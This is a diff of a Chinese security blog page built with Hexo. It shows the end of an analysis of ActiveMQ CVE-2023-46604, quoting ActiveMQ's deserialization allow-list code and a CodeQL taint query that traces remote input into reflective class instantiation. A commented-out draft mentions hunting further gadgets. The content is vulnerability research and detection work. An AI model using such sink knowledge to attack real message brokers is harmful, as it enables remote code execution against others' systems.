<span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>(is);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(desc.getName().startsWith(<span class="string">&quot;java.lang.&quot;</span>)</span><br><span class="line">                || desc.getName().startsWith(<span class="string">&quot;com.thoughtworks.xstream&quot;</span>)</span><br><span class="line">                || desc.getName().startsWith(<span class="string">&quot;java.util.&quot;</span>)</span><br><span class="line">                || desc.getName().length() &gt; <span class="number">2</span> &amp;&amp; desc.getName().substring(<span class="number">2</span>).startsWith(<span class="string">&quot;java.util.&quot;</span>) <span class="comment">// Allow arrays</span></span><br><span class="line">                || desc.getName().startsWith(<span class="string">&quot;org.apache.activemq.&quot;</span>))) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidClassException</span>(<span class="string">&quot;Unauthorized deserialization attempt&quot;</span>, desc.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.resolveClass(desc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-2-1-2-Object"><a href="#4-2-1-2-Object" class="headerlink" title="4.2.1.2 Object"></a>4.2.1.2 Object</h4><h5 id="ActiveMQObjectMessage"><a href="#ActiveMQObjectMessage" class="headerlink" title="ActiveMQObjectMessage"></a>ActiveMQObjectMessage</h5><p>ActiveMQObjectMessage.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ActiveMQObjectMessage</span> <span class="keyword">extends</span> <span class="title class_">ActiveMQMessage</span> <span class="keyword">implements</span> <span class="title class_">ObjectMessage</span>, TransientInitializer &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> List&lt;String&gt; trustedPackages = Arrays.asList(ClassLoadingAwareObjectInputStream.serializablePackages);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> <span class="type">boolean</span> <span class="variable">trustAllPackages</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">transient</span> Serializable object;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Serializable <span class="title function_">deserialize</span><span class="params">(ByteSequence content)</span> <span class="keyword">throws</span> JMSException &#123;</span><br><span class="line">    <span class="type">Serializable</span> <span class="variable">object</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (content != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(content);</span><br><span class="line">            <span class="keyword">if</span> (isCompressed()) &#123;</span><br><span class="line">                is = <span class="keyword">new</span> <span class="title class_">InflaterInputStream</span>(is);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">DataInputStream</span> <span class="variable">dataIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(is);</span><br><span class="line">            <span class="type">ClassLoadingAwareObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoadingAwareObjectInputStream</span>(dataIn);</span><br><span class="line">            objIn.setTrustedPackages(trustedPackages);</span><br><span class="line">            objIn.setTrustAllPackages(trustAllPackages);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                object = (Serializable)objIn.readObject();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException ce) &#123;</span><br><span class="line">                <span class="keyword">throw</span> JMSExceptionSupport.create(<span class="string">&quot;Failed to build body from content. Serializable class not available to broker. Reason: &quot;</span> + ce, ce);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                dataIn.close();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> JMSExceptionSupport.create(<span class="string">&quot;Failed to build body from bytes. Reason: &quot;</span> + e, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTrustedPackages</span><span class="params">(List&lt;String&gt; trustedPackages)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.trustedPackages = trustedPackages;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isTrustAllPackages</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> trustAllPackages;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTrustAllPackages</span><span class="params">(<span class="type">boolean</span> trustAllPackages)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.trustAllPackages = trustAllPackages;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="ActiveMQStreamMessage"><a href="#ActiveMQStreamMessage" class="headerlink" title="ActiveMQStreamMessage"></a>ActiveMQStreamMessage</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">readObject</span><span class="params">()</span> <span class="keyword">throws</span> JMSException &#123;</span><br><span class="line">    initializeReading();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.dataIn.mark(<span class="number">65</span>);</span><br><span class="line">        <span class="keyword">if</span> (type == -<span class="number">1</span>) &#123;</span><br><span class="line">        ...</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.dataIn.reset();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MessageFormatException</span>(<span class="string">&quot;unknown type&quot;</span>);</span><br><span class="line">        &#125;            </span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">readObject</span><span class="params">()</span> <span class="keyword">throws</span> JMSException &#123;</span><br><span class="line">    <span class="built_in">this</span>.checkWriteOnlyBody();</span><br><span class="line">    <span class="built_in">this</span>.checkBytesInFlight();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">result</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.facade.peek();</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        result = <span class="literal">null</span>;</span><br><span class="line">    ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(value <span class="keyword">instanceof</span> <span class="type">byte</span>[])) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MessageFormatException</span>(<span class="string">&quot;Unknown type found in stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] original = (<span class="type">byte</span>[])value;</span><br><span class="line">        result = <span class="keyword">new</span> <span class="title class_">byte</span>[original.length];</span><br><span class="line">        System.arraycopy(original, <span class="number">0</span>, result, <span class="number">0</span>, original.length);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>基本都封死了。</p>
+<!-- 
+
+## 4.3 新漏洞挖掘
+
+![upload successful](/images/pasted-711.png)
+
+- 此刻message.object 还为null
+- message ActiveMQObjectMessage#toString 可以触发toString类型的反序列化
+
+剩下的只是找toString触发即可
+
+![upload successful](/images/pasted-810.png)
+
+![upload successful](/images/pasted-811.png)
+
+-->
+
+
+<h1 id="0x05-CodeQL回归验证"><a href="#0x05-CodeQL回归验证" class="headerlink" title="0x05 CodeQL回归验证"></a>0x05 CodeQL回归验证</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@kind</span> path-problem</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java</span><br><span class="line"><span class="keyword">import</span> NewInstanceConfigFlow::PathGraph</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.DataFlow</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.FlowSources</span><br><span class="line"><span class="keyword">import</span> semmle.code.java.dataflow.ExternalFlow</span><br><span class="line"> </span><br><span class="line"><span class="keyword">module</span> NewInstanceConfig <span class="keyword">implements</span> <span class="title class_">DataFlow</span>::ConfigSig &#123;</span><br><span class="line">  <span class="type">int</span> <span class="title function_">fieldFlowBranchLimit</span><span class="params">()</span> &#123; result = <span class="number">10</span> &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">isSource</span><span class="params">(DataFlow::Node source)</span> &#123;</span><br><span class="line">    source <span class="keyword">instanceof</span> RemoteFlowSource</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">isSink</span><span class="params">(DataFlow::Node sink)</span> &#123;</span><br><span class="line">    exists(MethodAccess ma | </span><br><span class="line">        ma.getArgument(<span class="number">0</span>) = sink.asExpr()</span><br><span class="line">      | </span><br><span class="line">        ma.getMethod().hasName(<span class="string">&quot;newInstance&quot;</span>) and</span><br><span class="line">        ma.getMethod().getDeclaringType().hasQualifiedName(<span class="string">&quot;java.lang.reflect&quot;</span>, <span class="string">&quot;Constructor&lt;&gt;&quot;</span>)</span><br><span class="line">      )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> NewClassConfig <span class="keyword">implements</span> <span class="title class_">DataFlow</span>::ConfigSig &#123;</span><br><span class="line">  <span class="type">int</span> <span class="title function_">fieldFlowBranchLimit</span><span class="params">()</span> &#123; result = <span class="number">10</span> &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">isSource</span><span class="params">(DataFlow::Node source)</span> &#123;</span><br><span class="line">    source <span class="keyword">instanceof</span> RemoteFlowSource</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">isSink</span><span class="params">(DataFlow::Node sink)</span> &#123;</span><br><span class="line">    exists(MethodAccess ma | </span><br><span class="line">        ma.getArgument(<span class="number">0</span>) = sink.asExpr()</span><br><span class="line">      | </span><br><span class="line">        ma.getMethod().hasName(<span class="string">&quot;forName&quot;</span>)</span><br><span class="line">        and ma.getMethod().getDeclaringType().hasQualifiedName(<span class="string">&quot;java.lang&quot;</span>, <span class="string">&quot;Class&quot;</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">module</span> Class2ConstructorConfig <span class="keyword">implements</span> <span class="title class_">DataFlow</span>::ConfigSig &#123;</span><br><span class="line">  <span class="type">int</span> <span class="title function_">fieldFlowBranchLimit</span><span class="params">()</span> &#123; result = <span class="number">10</span> &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">isSource</span><span class="params">(DataFlow::Node source)</span> &#123;</span><br><span class="line">    exists(MethodAccess ma | </span><br><span class="line">      ma.getArgument(<span class="number">0</span>) = source.asExpr()</span><br><span class="line">    | </span><br><span class="line">      ma.getMethod().hasName(<span class="string">&quot;forName&quot;</span>)</span><br><span class="line">      and ma.getMethod().getDeclaringType().hasQualifiedName(<span class="string">&quot;java.lang&quot;</span>, <span class="string">&quot;Class&quot;</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">isSink</span><span class="params">(DataFlow::Node sink)</span> &#123;</span><br><span class="line">    exists(MethodAccess ma | </span><br><span class="line">      ma.getArgument(<span class="number">0</span>) = sink.asExpr()</span><br><span class="line">    | </span><br><span class="line">      ma.getMethod().hasName(<span class="string">&quot;newInstance&quot;</span>) and </span><br><span class="line">      ma.getMethod().getDeclaringType().hasQualifiedName(<span class="string">&quot;java.lang.reflect&quot;</span>, <span class="string">&quot;Constructor&lt;&gt;&quot;</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  predicate <span class="title function_">isAdditionalFlowStep</span><span class="params">(DataFlow::Node node1, DataFlow::Node node2)</span> &#123;</span><br><span class="line">    exists(MethodAccess ma | </span><br><span class="line">      node1.asExpr() = ma.getQualifier() and </span><br><span class="line">      node2.asExpr() = ma.getArgument(<span class="number">0</span>)</span><br><span class="line">      |</span><br><span class="line">      ma.getMethod().hasName(<span class="string">&quot;newInstance&quot;</span>) and </span><br><span class="line">      ma.getMethod().getDeclaringType().hasQualifiedName(<span class="string">&quot;java.lang.reflect&quot;</span>, <span class="string">&quot;Constructor&lt;&gt;&quot;</span>)</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">module</span> <span class="variable">NewInstanceConfigFlow</span> <span class="operator">=</span> TaintTracking::Global&lt;NewInstanceConfig&gt;;</span><br><span class="line"><span class="type">module</span> <span class="variable">NewClassConfigFlow</span> <span class="operator">=</span> TaintTracking::Global&lt;NewClassConfig&gt;;</span><br><span class="line"><span class="type">module</span> <span class="variable">Class2ConstructorConfigFlow</span> <span class="operator">=</span> TaintTracking::Global&lt;Class2ConstructorConfig&gt;;</span><br><span class="line"></span><br><span class="line">from NewInstanceConfigFlow::PathNode source, NewInstanceConfigFlow::PathNode sink</span><br><span class="line">  , NewClassConfigFlow::PathNode source2, NewClassConfigFlow::PathNode sink2</span><br><span class="line">  , Class2ConstructorConfigFlow::PathNode source3, Class2ConstructorConfigFlow::PathNode sink3</span><br><span class="line">where NewInstanceConfigFlow::flowPath(source, sink)</span><br><span class="line">  and NewClassConfigFlow::flowPath(source2, sink2)</span><br><span class="line">  and Class2ConstructorConfigFlow::flowPath(source3, sink3)</span><br><span class="line">  and source.getNode() = source2.getNode()</span><br><span class="line">  and sink2.getNode() = source3.getNode()</span><br><span class="line">  and sink.getNode() = sink3.getNode()</span><br><span class="line">select sink, source, sink, <span class="string">&quot;$@ -&gt; $@&quot;</span>, source, source.toString()</span><br><span class="line">  , sink2, sink2.toString()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-838.png" alt="upload successful"></p>
+<h1 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h1><ol>
+<li><a target="_blank" rel="noopener" href="https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f">https://github.com/apache/activemq/commit/958330df26cf3d5cdb63905dc2c6882e98781d8f</a></li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
         		<li class="article-tag-list-item">
         			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">CodeQL</a>
         		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ActiveMQ</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">CVE-2023-46604</a>
+        		</li>
       		
 		</ul>
 	</div>
@@ -554,103 +984,6 @@ ga('send', 'pageview');
       		 
         		<li class="article-tag-list-item">
         			<a href="/categories/Java安全/漏洞分析//" class="article-tag-list-link color5">漏洞分析</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-
-  
-    <article id="post-XStream反序列化（三）——Tabby CVE之旅" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/29/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94Tabby%20CVE%E4%B9%8B%E6%97%85/">XStream反序列化（三）——Tabby CVE之旅</a>
-    </h1>
-  
-
-        
-        <a href="/2021/08/29/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94Tabby%20CVE%E4%B9%8B%E6%97%85/" class="archive-article-date">
-  	<time datetime="2021-08-29T09:03:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-29</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>月底在即，再不写点东西，每月一篇都要食言了。上个月刚挖的OpenRASP的坑，本打算再研究研究绕过姿势，验证下猜想，也没下文。正好6月份交的XStream SSRF Gadget CVE下来，之前XStream系列草稿箱里也待着之前逆向分析师傅们挖掘的思路&amp;手法，正好编辑编辑，水一篇”如何挖掘XStream Gadgets”。</p>
-<p>首先感谢Wh1t3p1g师傅的Tabby，用起来比gadgetinspector更顺手，找链神器。</p>
-<h2 id="Tabby"><a href="#Tabby" class="headerlink" title="Tabby"></a>Tabby</h2><p>有关Tabby的介绍，详情可以参考【1】中Wh1t3p1g师傅的几个wiki，写的很详细了，这里也不多啰嗦。（这里膜一下Wh1t3p1g师傅）</p>
-<p>Neo4j 查询比较吃cpu，小本本加上idea同时跑吃力，搞台vps跑比较好，但是tabby是通过apoc.load.csv file写Neo4j数据的，相当于限制了本机，因此给下整库的dump和load（当然，直接整个在vps上操作也是ok的）。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># dump neo4j database</span></span><br><span class="line">neo4j-admin dump --to /tmp/neo4j.dump --database neo4j</span><br><span class="line"><span class="comment"># scp dump file to vps</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># load neo4j dump file</span></span><br><span class="line">./bin/neo4j stop</span><br><span class="line">./bin/neo4j-admin load --from=/root/neo4j.dump --database=neo4j --force</span><br><span class="line">./bin/neo4j start</span><br></pre></td></tr></table></figure>
-        
-          <a class="article-more-a" href="/2021/08/29/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89%E2%80%94%E2%80%94Tabby%20CVE%E4%B9%8B%E6%97%85/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Gadget</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Tabby</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">XStream</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/Java安全//" class="article-tag-list-link color2">Java安全</a>
         		</li>
       		
 		</ul>
@@ -688,7 +1021,7 @@ ga('send', 'pageview');
   
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/">« Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/3/">Next »</a>
+      <a class="extend prev" rel="prev" href="/">« Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/3/">Next »</a>
     </nav>
   
 
@@ -700,7 +1033,7 @@ ga('send', 'pageview');
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2022 m0d9
+    		&copy; 2025 m0d9
     	</div>
       	<div class="footer-right">
       		<!-- <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten -->
@@ -1033,11 +1366,67 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">CobaltStrike</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">IAST</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">DongTai</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Kafka</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Jaas</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CVE-2020-9297</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">BeanValidation</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Dubbo</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">CVE-2023-33246</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">RocketMQ</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Tai-e</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ActiveMQ</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">CVE-2023-22518</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">CVE-2023-46604</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Extractor</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Kylin</a>
               </li>
             
             <div class="clearfix"></div>
